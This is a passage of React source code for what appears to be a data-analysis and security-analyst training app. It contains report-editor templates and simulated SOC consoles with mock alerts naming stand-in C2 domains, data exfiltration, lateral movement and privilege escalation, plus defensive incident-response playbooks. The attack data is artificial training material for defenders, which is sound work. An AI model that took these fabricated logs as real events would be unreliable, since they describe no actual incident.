            <div style={{ ...cardStyle }}>
              <div style={labelStyle}>🎯 Metric Validation — vs ground truth computed from the same database</div>
              {validation.map((v, i) => (
                <div key={i} style={{ display: "flex", gap: 8, alignItems: "flex-start", padding: "5px 0", borderTop: i ? "1px solid #F3F4F6" : "none" }}>
                  <span style={{ fontSize: 12, flexShrink: 0 }}>{v.passed ? "✅" : "❌"}</span>
                  <div style={{ fontSize: 11, lineHeight: 1.5 }}>
                    <strong style={{ color: "#1A1714" }}>{v.input}</strong>
                    <span style={{ color: "#A8A29E" }}> — expected ≈ {v.expected} · {v.actual}</span>
                  </div>
                </div>
              ))}
            </div>
          )}

          {/* Charts row — from the user's published results */}
          <div style={{ display: "grid", gridTemplateColumns: "2fr 1fr", gap: 12 }}>
            <div style={{ ...cardStyle }}>
              <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", marginBottom: 12 }}>
                <div>
                  <div style={labelStyle}>📈 Trend — from your published TREND query</div>
                  {published.trend && <div style={{ fontSize: 10, color: "#A8A29E", fontFamily: "monospace" }}>{published.trend.columns.join(" · ")}</div>}
                </div>
                <div style={{ display: "flex", gap: 4 }}>
                  {["bar", "line"].map(ct => (
                    <button key={ct} onClick={() => setChartType(ct)} style={{ padding: "2px 8px", borderRadius: 4, border: `1px solid ${chartType === ct ? "#1E62B5" : "#E2DED7"}`, background: chartType === ct ? "#1E62B5" : "#F1EFE9", color: chartType === ct ? "#ffffff" : "#9A948E", fontSize: 9, fontWeight: 700, cursor: "pointer" }}>
                      {ct === "bar" ? "▦ Bar" : "↗ Line"}
                    </button>
                  ))}
                </div>
              </div>
              {published.trend
                ? <UserTrendChart rs={published.trend} chartType={chartType} />
                : <EmptyChartState label="No trend yet — publish a monthly GROUP BY query as 📈 Trend in the Build tab" />}
            </div>

            <div style={cardStyle}>
              <div style={labelStyle}>🥧 Breakdown — from your published BREAKDOWN query</div>
              {published.breakdown
                ? <UserDonut rs={published.breakdown} />
                : <EmptyChartState label="No breakdown yet — publish a category or segment query as 🥧 Breakdown" />}
            </div>
          </div>

          {/* Insights box — rubric-guided (unchanged: scored by the AI evaluator) */}
          <div style={{ background: "#ffffff", borderRadius: 11, padding: "14px 16px", boxShadow: "0 1px 4px rgba(0,0,0,0.06)", border: "1px solid #E2DED7" }}>
            <div style={{ display: "flex", justifyContent: "space-between", alignItems: "flex-start", marginBottom: 12 }}>
              <div>
                <div style={labelStyle}>✍️ Your Analysis & Insights</div>
                <div style={{ fontSize: 10, color: "#9A948E" }}>Base these on the numbers you actually computed — the AI evaluator scores each field</div>
              </div>
              <div style={{ fontSize: 9, fontWeight: 700, color: "#1D4ED8", background: "#EFF6FF", padding: "3px 10px", borderRadius: 99, border: "1px solid #BFDBFE" }}>
                4 rubric criteria
              </div>
            </div>
            <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: 10 }}>
              {[
                { key: "trend",   icon: "📈", label: "Trend",              hint: "Direction + % change, with the month that moved it." },
                { key: "segment", icon: "🥧", label: "Segment Leader",     hint: "Which group drives the most value, and is it growing?" },
                { key: "concern", icon: "⚠️", label: "Concern / Risk",     hint: "Which metric is moving the wrong way? Data quality issues count." },
                { key: "action",  icon: "🎯", label: "Recommended Action", hint: "One specific, measurable action tied to your numbers." },
              ].map(field => (
                <div key={field.key} style={{ background: "#F8F7F4", borderRadius: 8, padding: "10px 11px", border: "1px solid #E2DED7" }}>
                  <div style={{ display: "flex", gap: 6, alignItems: "center", marginBottom: 5 }}>
                    <span style={{ fontSize: 13 }}>{field.icon}</span>
                    <span style={{ fontSize: 10, fontWeight: 800, color: "#1A1714" }}>{field.label}</span>
                    <div style={{ marginLeft: "auto", fontSize: 8, color: "#A8A29E", maxWidth: 140, textAlign: "right", lineHeight: 1.3 }}>{field.hint}</div>
                  </div>
                  <textarea
                    value={insights[field.key] || ""}
                    onChange={e => setInsights(prev => ({ ...prev, [field.key]: e.target.value }))}
                    placeholder={`Write your ${field.label.toLowerCase()} insight based on your actual results…`}
                    style={{ width: "100%", minHeight: 64, border: "1px solid #E2DED7", borderRadius: 6, padding: "6px 8px", fontSize: 11, fontFamily: "inherit", resize: "vertical", outline: "none", boxSizing: "border-box", color: "#1A1714", lineHeight: 1.65, background: "#ffffff" }}
                    onFocus={e => e.target.style.borderColor = "#2563EB"}
                    onBlur={e => e.target.style.borderColor = "#E8E3DA"}
                  />
                </div>
              ))}
            </div>
          </div>
        </div>
      )}
    </div>
  )
}

// ─────────────────────────────────────────────────────────────────────────────
// 9. ANALYSIS REPORT WORKSTATION  (structured report editor)
// ─────────────────────────────────────────────────────────────────────────────
const buildReportSections = (mission) => {
  const title = (mission?.title || "").toLowerCase()
  const isEcom    = /order|swiggy|zomato|flipkart|meesho|commerce/i.test(title)
  const isFintech = /payment|razorpay|phonepe|churn|fintech|loan/i.test(title)

  if (isEcom) return [
    { id: "executive_summary", label: "Executive Summary",     placeholder: "Summarize 2-3 key findings for a non-technical audience. E.g. 'Cancellation rate rose 2.1% in Dec, costing ~₹4.2L in revenue. Electronics drives 38% of GMV.'" },
    { id: "data_overview",     label: "Data Overview",         placeholder: "Describe the dataset: how many orders, date range, cities covered, what data quality issues were found (NULLs, duplicates, casing errors)." },
    { id: "key_findings",      label: "Key Findings",          placeholder: "Top 3-5 insights with numbers. E.g. '1. Bangalore + Mumbai = 62% of orders. 2. Electronics avg delivery 2.4 days vs Groceries 1.1 days. 3. ORD007 had wrong date format...'" },
    { id: "root_cause",        label: "Root Cause Analysis",   placeholder: "What's driving the cancellations / returns? Is it payment failures, delivery delays, or product category issues? Use data." },
    { id: "recommendations",   label: "Recommendations",       placeholder: "Prioritized actions. E.g. '1. Auto-fill NULL amounts from payment gateway logs. 2. Add real-time city-name normaliser. 3. Investigate Returned orders in Electronics...'" },
    { id: "limitations",       label: "Data Gaps & Caveats",   placeholder: "What data is missing? E.g. 'No customer age or gender. Delivery days missing for 3 rows. Return reason not captured.'" },
  ]
  if (isFintech) return [
    { id: "executive_summary", label: "Executive Summary",     placeholder: "2-3 sentence summary for business stakeholders. E.g. 'Success rate improved to 87.4% but Timeout rate rose 0.9% — indicating backend latency issues with Card payments.'" },
    { id: "data_overview",     label: "Data Overview",         placeholder: "Dataset: how many transactions, date range, merchants covered. Data quality issues: NULLs, duplicates, casing inconsistencies, bad dates found." },
    { id: "key_findings",      label: "Key Findings",          placeholder: "Specific insights: '1. UPI accounts for 52% of volume. 2. TXN002 + TXN006 had response_time > 8000ms. 3. Card failures 3x higher than UPI failures...'" },
    { id: "root_cause",        label: "Root Cause Analysis",   placeholder: "Why are Card payments failing more? Are high response times correlated with failures? Which merchants show the worst performance?" },
    { id: "recommendations",   label: "Recommendations",       placeholder: "E.g. '1. Flag all transactions with response_time > 5000ms as Timeout. 2. Alert on NULL amounts immediately. 3. A/B test Netbanking fallback to UPI...'" },
    { id: "limitations",       label: "Data Gaps & Caveats",   placeholder: "E.g. 'No geographic data. User demographic missing. Merchant category not captured. 2-week window may miss seasonal patterns.'" },
  ]
  // Default SaaS
  return [
    { id: "executive_summary", label: "Executive Summary",     placeholder: "Key insight for leadership: E.g. 'Churn rate climbed to 6.2% in Mar, driven by Free-plan users with <5 sessions. Pro plan MRR grew 11.3% — expansion > new acquisition.'" },
    { id: "data_overview",     label: "Data Overview",         placeholder: "Dataset: how many users, date range, plans included. Data quality issues found: NULLs, duplicates, casing errors, bad dates." },
    { id: "key_findings",      label: "Key Findings",          placeholder: "Numbered list with metrics. E.g. '1. 23% of users on Free plan have 0 sessions — pre-churn signal. 2. Enterprise NPS = 9.4 vs Free = 5.8. 3. 2 NULL MRR values in Enterprise plan...'" },
    { id: "root_cause",        label: "Root Cause Analysis",   placeholder: "Why is churn up? Is low session count predictive? Are At-Risk users concentrated in specific countries or plan tiers? What does the data tell you?" },
    { id: "recommendations",   label: "Recommendations",       placeholder: "E.g. '1. Trigger in-app nudge if sessions < 5 and status = Active. 2. Offer Pro trial to At-Risk Free users. 3. Investigate NULL MRR in Enterprise — billing system error?'" },
    { id: "limitations",       label: "Data Gaps & Caveats",   placeholder: "E.g. 'No feature usage data beyond session count. Country-level analysis limited — only India represented. 30-day snapshot may not reflect annual churn pattern.'" },
  ]
}

function ReportWorkstation({ mission, code, onCodeChange }) {
  const REPORT_SECTIONS = buildReportSections(mission)
  const [activeSection, setActiveSection] = useState("executive_summary")
  const [preview, setPreview]             = useState(false)

  // Parse sections from serialized code
  const parseSections = (raw) => {
    const result = {}
    REPORT_SECTIONS.forEach(s => {
      const regex = new RegExp(`## ${s.label}\\n([\\s\\S]*?)(?=\\n## |$)`)
      const match = raw.match(regex)
      result[s.id] = match ? match[1].trim() : ""
    })
    return result
  }
  const [sections, setSections] = useState(() => parseSections(code || ""))

  const updateSection = (id, val) => {
    const updated = { ...sections, [id]: val }
    setSections(updated)
    const serialized = REPORT_SECTIONS.map(s => `## ${s.label}\n${updated[s.id] || ""}`).join("\n\n")
    onCodeChange(serialized)
  }

  const wordCount = Object.values(sections).join(" ").split(/\s+/).filter(Boolean).length
  const completedSections = REPORT_SECTIONS.filter(s => (sections[s.id] || "").trim().length > 20).length

  return (
    <div style={{ flex: 1, display: "flex", overflow: "hidden", minHeight: 0 }}>
      {/* Section nav */}
      <div style={{ width: 200, flexShrink: 0, borderRight: `1px solid ${T.border}`, display: "flex", flexDirection: "column", background: "#FAFAFA" }}>
        <div style={{ padding: "10px 12px 6px", borderBottom: `1px solid ${T.border}` }}>
          <div style={{ fontSize: 11, fontWeight: 800, color: T.ink }}>📝 Analysis Report</div>
          <div style={{ fontSize: 10, color: T.ink3, marginTop: 3 }}>{completedSections}/{REPORT_SECTIONS.length} sections · {wordCount} words</div>
          {/* Progress bar */}
          <div style={{ height: 4, background: T.border, borderRadius: 2, marginTop: 6 }}>
            <div style={{ height: 4, background: T.green, borderRadius: 2, width: `${(completedSections / REPORT_SECTIONS.length) * 100}%`, transition: "width 0.3s" }} />
          </div>
        </div>
        <div style={{ overflow: "auto", padding: "6px 6px" }}>
          {REPORT_SECTIONS.map((s, i) => {
            const done = (sections[s.id] || "").trim().length > 20
            return (
              <button key={s.id} onClick={() => setActiveSection(s.id)} style={{
                width: "100%", textAlign: "left", padding: "7px 10px", borderRadius: 7,
                border: "none", cursor: "pointer", display: "flex", gap: 8, alignItems: "center",
                background: activeSection === s.id ? T.green + "15" : "transparent",
                marginBottom: 2,
              }}>
                <span style={{ fontSize: 12, color: done ? T.green : T.ink3 }}>{done ? "✓" : `${i + 1}.`}</span>
                <span style={{ fontSize: 11, fontWeight: activeSection === s.id ? 700 : 500, color: activeSection === s.id ? T.green : T.ink2, lineHeight: 1.3 }}>{s.label}</span>
              </button>
            )
          })}
        </div>
        <div style={{ padding: "8px 10px", borderTop: `1px solid ${T.border}`, marginTop: "auto" }}>
          <button onClick={() => setPreview(p => !p)} style={{
            width: "100%", padding: "6px", borderRadius: 7, border: `1px solid ${T.border}`,
            background: preview ? T.green : T.bg2, color: preview ? "#ffffff" : T.ink2,
            fontSize: 11, fontWeight: 700, cursor: "pointer",
          }}>
            {preview ? "✏️ Edit" : "👁 Preview"}
          </button>
        </div>
      </div>

      {/* Editor / Preview */}
      <div style={{ flex: 1, display: "flex", flexDirection: "column", overflow: "hidden" }}>
        {!preview ? (
          <>
            <div style={{ padding: "10px 16px 8px", borderBottom: `1px solid ${T.border}`, flexShrink: 0 }}>
              <div style={{ fontSize: 13, fontWeight: 800, color: T.ink }}>
                {REPORT_SECTIONS.find(s => s.id === activeSection)?.label}
              </div>
              <div style={{ fontSize: 10, color: T.ink3, marginTop: 2 }}>
                {REPORT_SECTIONS.find(s => s.id === activeSection)?.placeholder}
              </div>
            </div>
            <textarea
              key={activeSection}
              value={sections[activeSection] || ""}
              onChange={e => updateSection(activeSection, e.target.value)}
              placeholder={REPORT_SECTIONS.find(s => s.id === activeSection)?.placeholder}
              style={{
                flex: 1, border: "none", outline: "none", resize: "none",
                padding: "14px 18px", fontSize: 13, lineHeight: 1.8,
                fontFamily: "Georgia, serif", color: T.ink, background: "#ffffff",
              }}
            />
          </>
        ) : (
          <div style={{ flex: 1, overflow: "auto", padding: "20px 28px", background: "#ffffff", fontFamily: "Georgia, serif" }}>
            <h1 style={{ fontSize: 20, fontWeight: 800, color: T.ink, borderBottom: `2px solid ${T.green}`, paddingBottom: 8, marginBottom: 20 }}>
              {mission?.title || "Analysis Report"}
            </h1>
            {REPORT_SECTIONS.map(s => (
              sections[s.id] ? (
                <div key={s.id} style={{ marginBottom: 20 }}>
                  <h2 style={{ fontSize: 14, fontWeight: 800, color: T.green, marginBottom: 8 }}>{s.label}</h2>
                  <p style={{ fontSize: 13, lineHeight: 1.8, color: T.ink2, margin: 0, whiteSpace: "pre-wrap" }}>{sections[s.id]}</p>
                </div>
              ) : null
            ))}
            {completedSections === 0 && (
              <div style={{ color: T.ink3, fontSize: 12, fontStyle: "italic" }}>No content yet — start writing in the editor.</div>
            )}
          </div>
        )}
      </div>
    </div>
  )
}

// ─────────────────────────────────────────────────────────────────────────────
// DEFAULT CODE WORKSTATION  (falls back to existing CodeEditor via prop)
// ─────────────────────────────────────────────────────────────────────────────
function CodeWorkstation({ code, onCodeChange, sandbox, language, domainKey, CodeEditor }) {
  return (
    <div style={{ flex: 1, overflow: "hidden", minHeight: 0 }}>
      <CodeEditor
        value={code}
        onChange={onCodeChange}
        sandbox={sandbox}
        language={language}
        domainKey={domainKey}
      />
    </div>
  )
}

// ─────────────────────────────────────────────────────────────────────────────
// WORKSTATION ROUTER — the main export used by Arena.jsx
// ─────────────────────────────────────────────────────────────────────────────
/**
 * Props:
 *   mission       – current mission object
 *   domain        – domain config object (has .color, etc.)
 *   domainKey     – string domain key
 *   moduleSandbox – sandbox string from the active module
 *   code          – current editor value
 *   onCodeChange  – (val: string) => void
 *   CodeEditor    – the existing CodeEditor component (used for "code" fallback)
 */
// ─────────────────────────────────────────────────────────────────────────────
// SECURITY CONSOLE  (Cybersecurity / SOC domains)
// ─────────────────────────────────────────────────────────────────────────────
const SECURITY_LOG_SCENARIOS = [
  { time:"2024-01-15 02:14:33", src:"192.168.1.45",  dst:"10.0.0.1",   event:"FAILED_LOGIN",         detail:"5 failed SSH attempts in 30s",            severity:"HIGH"   },
  { time:"2024-01-15 02:14:41", src:"192.168.1.45",  dst:"10.0.0.1",   event:"BRUTE_FORCE_DETECTED", detail:"Threshold exceeded — auth lockout",       severity:"CRIT"   },
  { time:"2024-01-15 02:15:02", src:"10.0.0.1",      dst:"203.0.113.5",event:"OUTBOUND_DNS",          detail:"Unusual DNS query: evil.c2server.io",     severity:"HIGH"   },
  { time:"2024-01-15 02:15:44", src:"10.0.0.1",      dst:"203.0.113.5",event:"DATA_EXFIL",            detail:"8.2 GB transferred to unknown external",  severity:"CRIT"   },
  { time:"2024-01-15 02:16:12", src:"10.0.0.55",     dst:"10.0.0.1",   event:"LATERAL_MOVEMENT",     detail:"WMI exec on host — credential relay",     severity:"CRIT"   },
  { time:"2024-01-15 02:18:00", src:"10.0.0.1",      dst:"10.0.0.88",  event:"PERSISTENCE",          detail:"New scheduled task: svchost_update.exe",  severity:"HIGH"   },
  { time:"2024-01-15 02:19:30", src:"192.168.2.10",  dst:"10.0.0.0/24",event:"PORT_SCAN",             detail:"NMAP SYN scan detected — 1024 ports",    severity:"MED"    },
  { time:"2024-01-15 02:22:15", src:"10.0.0.1",      dst:"10.0.0.100", event:"PRIV_ESCALATION",      detail:"Token impersonation via SeImpersonatePrivilege", severity:"CRIT"},
]

function SecurityConsole({ mission, code, onCodeChange }) {
  const [query, setQuery]         = useState("")
  const [results, setResults]     = useState([])
  const [selectedAlert, setAlert] = useState(null)
  const [dispositions, setDisp]   = useState({})
  const [notes, setNotes]         = useState(code || "")
  const [tab, setTab]             = useState("alerts")

  const SEV_COLORS = { CRIT:"#DC2626", HIGH:"#EA580C", MED:"#D97706", LOW:"#059669" }

  function runQuery() {
    const q = query.toLowerCase()
    const filtered = SECURITY_LOG_SCENARIOS.filter(r =>
      !q || Object.values(r).some(v => String(v).toLowerCase().includes(q))
    )
    setResults(filtered)
  }

  function triage(idx, disposition) {
    setDisp(d => ({ ...d, [idx]: disposition }))
    const entry = SECURITY_LOG_SCENARIOS[idx]
    const line  = `[${new Date().toISOString()}] TRIAGED: ${entry.event} from ${entry.src} → ${disposition.toUpperCase()}\n`
    const updated = notes + line
    setNotes(updated)
    onCodeChange(updated)
  }

  return (
    <div style={{ flex:1, display:"flex", flexDirection:"column", minHeight:0, background:T.bg2, fontFamily:"'DM Mono',monospace" }}>
      {/* Tabs */}
      <div style={{ display:"flex", gap:0, background:T.bg, borderBottom:`1px solid ${T.border}` }}>
        {["alerts","siem_query","investigation"].map(t => (
          <button key={t} onClick={() => setTab(t)}
            style={{ padding:"9px 16px", background:"none", border:"none", borderBottom:`2px solid ${tab===t?"#DC2626":"transparent"}`, color:tab===t?"#DC2626":T.ink3, fontSize:11, fontWeight:tab===t?800:400, cursor:"pointer", textTransform:"uppercase", letterSpacing:1 }}>
            {t.replace("_"," ")}
          </button>
        ))}
        <div style={{ flex:1 }} />
        <div style={{ padding:"9px 16px", fontSize:10, color:"#DC2626", fontWeight:700, display:"flex", alignItems:"center", gap:5 }}>
          <span style={{ width:7, height:7, borderRadius:"50%", background:"#DC2626", display:"inline-block", animation:"pulseRing 2s ease-out infinite" }} />
          LIVE MONITORING
        </div>
      </div>

      {/* Alert Queue */}
      {tab === "alerts" && (
        <div style={{ flex:1, display:"flex", minHeight:0 }}>
          <div style={{ flex:1, overflowY:"auto", padding:12 }}>
            <div style={{ fontSize:10, color:T.ink4, marginBottom:8, letterSpacing:1 }}>ALERT QUEUE — {SECURITY_LOG_SCENARIOS.length} EVENTS</div>
            {SECURITY_LOG_SCENARIOS.map((alert, i) => (
              <div key={i} onClick={() => setAlert(alert)}
                style={{ background:selectedAlert===alert?"#FEF2F2":T.bg, border:`1px solid ${selectedAlert===alert?"#DC262640":T.border}`, borderLeft:`3px solid ${SEV_COLORS[alert.severity]||"#A8A29E"}`, borderRadius:8, padding:"9px 12px", marginBottom:7, cursor:"pointer", transition:"all .12s" }}>
                <div style={{ display:"flex", justifyContent:"space-between", alignItems:"flex-start", marginBottom:4 }}>
                  <span style={{ fontSize:11, fontWeight:700, color:SEV_COLORS[alert.severity], background:SEV_COLORS[alert.severity]+"15", padding:"1px 7px", borderRadius:99 }}>{alert.severity}</span>
                  <span style={{ fontSize:10, color:T.ink4 }}>{alert.time}</span>
                  {dispositions[i] && <span style={{ fontSize:10, fontWeight:700, color:dispositions[i]==="true_positive"?"#DC2626":"#059669" }}>{dispositions[i]==="true_positive"?"🔴 TP":"🟢 FP"}</span>}
                </div>
                <div style={{ fontSize:12, fontWeight:700, color:T.ink, marginBottom:2 }}>{alert.event}</div>
                <div style={{ fontSize:11, color:T.ink3 }}>{alert.src} → {alert.dst}</div>
                <div style={{ fontSize:11, color:T.ink2, marginTop:3 }}>{alert.detail}</div>
                {!dispositions[i] && (
                  <div style={{ display:"flex", gap:6, marginTop:8 }}>
                    <button onClick={e=>{e.stopPropagation();triage(i,"true_positive")}} style={{ flex:1, padding:"4px 0", background:"#FEF2F2", border:"1px solid #DC262640", borderRadius:6, fontSize:10, fontWeight:700, color:"#DC2626", cursor:"pointer" }}>🔴 True Positive</button>
                    <button onClick={e=>{e.stopPropagation();triage(i,"false_positive")}} style={{ flex:1, padding:"4px 0", background:"#F0FDF4", border:"1px solid #05966940", borderRadius:6, fontSize:10, fontWeight:700, color:"#059669", cursor:"pointer" }}>🟢 False Positive</button>
                  </div>
                )}
              </div>
            ))}
          </div>
          {/* Evidence log */}
          <div style={{ width:300, borderLeft:`1px solid ${T.border}`, display:"flex", flexDirection:"column" }}>
            <PanelHeader color={T.ink3}>INVESTIGATION LOG</PanelHeader>
            <textarea value={notes} onChange={e=>{setNotes(e.target.value);onCodeChange(e.target.value)}}
              style={{ flex:1, padding:12, background:"#0A0A10", color:"#22D3EE", fontSize:11, fontFamily:"'DM Mono',monospace", border:"none", resize:"none", outline:"none", lineHeight:1.6 }}
              placeholder="Document your findings here..." />
          </div>
        </div>
      )}

      {/* SIEM Query */}
      {tab === "siem_query" && (
        <div style={{ flex:1, display:"flex", flexDirection:"column", padding:16 }}>
          <div style={{ fontSize:10, color:T.ink4, marginBottom:8, letterSpacing:1 }}>SIEM QUERY INTERFACE — SPLUNK-STYLE</div>
          <div style={{ display:"flex", gap:8, marginBottom:12 }}>
            <input value={query} onChange={e=>setQuery(e.target.value)}
              placeholder="index=main severity=CRIT | stats count by src_ip"
              style={{ flex:1, padding:"9px 12px", background:"#0A0A10", color:"#22D3EE", border:`1px solid ${T.border}`, borderRadius:8, fontSize:12, fontFamily:"'DM Mono',monospace", outline:"none" }}
              onKeyDown={e=>e.key==="Enter"&&runQuery()} />
            <button onClick={runQuery} style={{ padding:"9px 20px", background:"#DC2626", border:"none", borderRadius:8, color:"#ffffff", fontSize:12, fontWeight:700, cursor:"pointer" }}>Run</button>
          </div>
          <div style={{ flex:1, background:"#0A0A10", borderRadius:8, padding:12, overflow:"auto" }}>
            {results.length === 0
              ? <div style={{ color:"#A8A29E", fontSize:11 }}>Run a query to see results. Try: leave empty and press Run to search all events.</div>
              : results.map((r,i) => (
                  <div key={i} style={{ borderBottom:"1px solid #1F2937", paddingBottom:8, marginBottom:8 }}>
                    <span style={{ color:SEV_COLORS[r.severity]||"#A8A29E", fontWeight:700, fontSize:10, marginRight:8 }}>{r.severity}</span>
                    <span style={{ color:"#22D3EE", fontSize:11 }}>{r.time}</span>
                    <span style={{ color:"#F59E0B", fontSize:11, margin:"0 8px" }}>{r.src} → {r.dst}</span>
                    <span style={{ color:"#D6D0C8", fontSize:11 }}>{r.event}: {r.detail}</span>
                  </div>
                ))
            }
          </div>
        </div>
      )}

      {/* Investigation canvas */}
      {tab === "investigation" && (
        <div style={{ flex:1, display:"flex", flexDirection:"column", padding:16 }}>
          <div style={{ fontSize:10, color:T.ink4, marginBottom:8, letterSpacing:1 }}>INCIDENT REPORT CANVAS</div>
          <textarea value={notes} onChange={e=>{setNotes(e.target.value);onCodeChange(e.target.value)}}
            style={{ flex:1, padding:14, background:"#0A0A10", color:"#E8E3DA", fontSize:12, fontFamily:"'DM Mono',monospace", border:`1px solid ${T.border}`, borderRadius:8, resize:"none", outline:"none", lineHeight:1.7 }}
            placeholder={`## Incident Report\n\n**Summary:** \n\n**Attack Type:** \n\n**Affected Systems:** \n\n**Timeline:**\n- HH:MM — \n\n**Indicators of Compromise (IoC):**\n- IP: \n- Domain: \n\n**Recommended Actions:**\n1. `} />
        </div>
      )}
    </div>
  )
}

// ─────────────────────────────────────────────────────────────────────────────
// SOC IR CONSOLE  (SOC Analyst / Incident Response)
// ─────────────────────────────────────────────────────────────────────────────
const IR_ALERTS = [
  { id:1, title:"Ransomware activity detected",      severity:"P1", src:"EDR",   assigned:false, detail:"Encrypted files found on FS01. cbengine.exe process detected. IOC hash: a3f2c9..." },
  { id:2, title:"Suspicious PowerShell execution",  severity:"P2", src:"SIEM",  assigned:false, detail:"Encoded PowerShell bypass on WORKSTATION-14. MITRE T1059.001" },
  { id:3, title:"External port scan from 185.x.x.x",severity:"P2", src:"FW",    assigned:false, detail:"1200 ports scanned in 60s. ASN: Hostile-ISP. First seen 4h ago." },
  { id:4, title:"User account locked — 10 fails",   severity:"P3", src:"AD",    assigned:false, detail:"alice@corp.com locked after 10 bad passwords from 3 IPs in 2 min." },
  { id:5, title:"DNS beacon to known C2 domain",    severity:"P1", src:"DNS",   assigned:false, detail:"evil-c2.xyz queried 248 times in 10 min. ThreatIntel: confirmed malicious." },
]

const PLAYBOOK_STEPS = {
  ransomware:["Isolate affected host from network","Preserve memory dump","Identify patient zero via EDR timeline","Check VSS (shadow copies) status","Notify management & legal","Block C2 IPs at firewall","Begin recovery from clean backup"],
  phishing:["Quarantine the email","Extract IOCs: sender, URLs, attachments","Search mailboxes for similar emails","Reset credentials of affected users","Block sender domain at email gateway","Document affected users"],
  bruteforce:["Confirm true positive — check auth logs","Lock affected accounts","Review IP geolocation — block if foreign","Check for successful logins from same IP","Enable MFA if not active","Alert user"],
}

function SOCConsole({ mission, code, onCodeChange }) {
  const [alerts, setAlerts]       = useState(IR_ALERTS)
  const [selected, setSelected]   = useState(null)
  const [timeline, setTimeline]   = useState([])
  const [playbook, setPlaybook]   = useState(null)
  const [checkedSteps, setChecked]= useState({})
  const [tab, setTab]             = useState("queue")
  const [notes, setNotes]         = useState(code || "")

  const SEV = { P1:"#DC2626", P2:"#EA580C", P3:"#D97706", P4:"#059669" }

  function assign(id) {
    setAlerts(a => a.map(al => al.id===id ? {...al,assigned:true} : al))
    const al = alerts.find(a=>a.id===id)
    const entry = {time:new Date().toLocaleTimeString(), action:`ASSIGNED alert #${id}: ${al.title}`}
    setTimeline(t => [entry,...t])
    const key = al.title.toLowerCase().includes("ransom") ? "ransomware" : al.title.toLowerCase().includes("powershell") || al.title.toLowerCase().includes("phish") ? "phishing" : "bruteforce"
    setPlaybook(PLAYBOOK_STEPS[key] || PLAYBOOK_STEPS.bruteforce)
    setSelected(al)
  }

  function checkStep(i) {
    setChecked(c => {
      const n = {...c, [i]:!c[i]}
      const entry = {time:new Date().toLocaleTimeString(), action:`${n[i]?"✓":"○"} Step ${i+1}: ${playbook[i]}`}
      setTimeline(t => [entry,...t])
      const log = `[${entry.time}] ${entry.action}\n`
      const updated = notes + log; setNotes(updated); onCodeChange(updated)
      return n
    })
  }

  return (
    <div style={{ flex:1, display:"flex", flexDirection:"column", minHeight:0, background:T.bg2, fontFamily:"'DM Mono',monospace" }}>
      <div style={{ display:"flex", gap:0, background:T.bg, borderBottom:`1px solid ${T.border}` }}>
        {["queue","playbook","timeline"].map(t=>(
          <button key={t} onClick={()=>setTab(t)} style={{ padding:"9px 16px", background:"none", border:"none", borderBottom:`2px solid ${tab===t?"#DC2626":"transparent"}`, color:tab===t?"#DC2626":T.ink3, fontSize:11, fontWeight:tab===t?800:400, cursor:"pointer", textTransform:"uppercase", letterSpacing:1 }}>
            {t}
          </button>
        ))}
        <div style={{ flex:1 }} />
        <div style={{ padding:"9px 16px", fontSize:10, color:"#A8A29E" }}>{alerts.filter(a=>a.assigned).length}/{alerts.length} assigned</div>
      </div>

      {tab==="queue" && (
        <div style={{ flex:1, overflowY:"auto", padding:12 }}>
          <div style={{ fontSize:10, color:T.ink4, marginBottom:10, letterSpacing:1 }}>LIVE ALERT QUEUE — TRIAGE REQUIRED</div>
          {alerts.map(al=>(
            <div key={al.id} style={{ background:al.assigned?"#F0FDF4":T.bg, border:`1px solid ${al.assigned?"#05966940":T.border}`, borderLeft:`3px solid ${SEV[al.severity]}`, borderRadius:8, padding:"10px 12px", marginBottom:8 }}>
              <div style={{ display:"flex", justifyContent:"space-between", marginBottom:5 }}>
                <span style={{ fontSize:11, fontWeight:800, color:SEV[al.severity], background:SEV[al.severity]+"15", padding:"1px 8px", borderRadius:99 }}>{al.severity}</span>
                <span style={{ fontSize:10, color:T.ink4 }}>Source: {al.src}</span>
              </div>
              <div style={{ fontSize:12, fontWeight:700, color:T.ink, marginBottom:3 }}>{al.title}</div>
              <div style={{ fontSize:11, color:T.ink3, marginBottom:8 }}>{al.detail}</div>
              {!al.assigned
                ? <button onClick={()=>assign(al.id)} style={{ padding:"5px 14px", background:"#DC2626", border:"none", borderRadius:6, color:"#ffffff", fontSize:10, fontWeight:700, cursor:"pointer" }}>Assign & Respond →</button>
                : <span style={{ fontSize:10, color:"#059669", fontWeight:700 }}>✓ Assigned — see Playbook tab</span>
              }
            </div>
          ))}
        </div>
      )}

      {tab==="playbook" && (
        <div style={{ flex:1, overflow:"auto", padding:16 }}>
          {!playbook
            ? <div style={{ color:T.ink3, fontSize:12 }}>Assign an alert to load its IR playbook.</div>
            : <>
                <div style={{ fontSize:12, fontWeight:700, color:T.ink, marginBottom:4 }}>{selected?.title}</div>
                <div style={{ fontSize:10, color:T.ink4, marginBottom:14 }}>IR Playbook — check off each step as you complete it</div>
                {playbook.map((step,i)=>(
                  <div key={i} onClick={()=>checkStep(i)}
                    style={{ display:"flex", gap:12, alignItems:"flex-start", padding:"9px 12px", background:checkedSteps[i]?"#F0FDF4":T.bg, border:`1px solid ${checkedSteps[i]?"#05966940":T.border}`, borderRadius:8, marginBottom:8, cursor:"pointer" }}>
                    <div style={{ width:20, height:20, borderRadius:4, border:`2px solid ${checkedSteps[i]?"#059669":"#D6D0C8"}`, background:checkedSteps[i]?"#059669":"transparent", display:"flex", alignItems:"center", justifyContent:"center", flexShrink:0, color:checkedSteps[i]?"#ffffff":"transparent", fontSize:11 }}>
                      {checkedSteps[i]?"✓":""}
                    </div>
                    <span style={{ fontSize:12, color: checkedSteps[i]?T.ink3:T.ink, textDecoration: checkedSteps[i]?"line-through":"none", lineHeight:1.5 }}>
                      Step {i+1}: {step}
                    </span>
                  </div>
                ))}
              </>
          }
        </div>
      )}

      {tab==="timeline" && (
        <div style={{ flex:1, display:"flex", flexDirection:"column", padding:16 }}>
          <div style={{ fontSize:10, color:T.ink4, marginBottom:8, letterSpacing:1 }}>INCIDENT TIMELINE</div>
          <div style={{ flex:1, background:"#0A0A10", borderRadius:8, padding:12, overflow:"auto" }}>
            {timeline.length===0
              ? <div style={{ color:"#A8A29E", fontSize:11 }}>Timeline entries appear as you work the incident.</div>
              : timeline.map((e,i)=>(
                  <div key={i} style={{ borderBottom:"1px solid #1F2937", paddingBottom:6, marginBottom:6 }}>
                    <span style={{ color:"#22D3EE", fontSize:10 }}>{e.time}</span>
                    <span style={{ color:"#D6D0C8", fontSize:11, marginLeft:10 }}>{e.action}</span>
                  </div>
                ))
            }
          </div>
